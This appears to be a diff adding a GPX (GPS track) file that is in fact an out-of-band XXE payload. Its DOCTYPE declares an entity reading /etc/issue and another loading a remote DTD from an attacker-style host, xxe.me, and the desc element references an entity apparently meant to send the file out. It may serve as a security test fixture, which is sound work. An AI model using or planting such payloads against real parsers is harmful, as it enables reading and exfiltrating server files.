@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gpx [ 
+ <!ENTITY % file SYSTEM "file:///etc/issue">
+ <!ENTITY % dtd SYSTEM "http://xxe.me/evil1.dtd">
+%dtd;]>
+<gpx creator="EliteGPS" version="1.0" xmlns="http://www.topografix.com/GPX/1/0">
+  <desc>&send;</desc>
+
+</gpx>
+
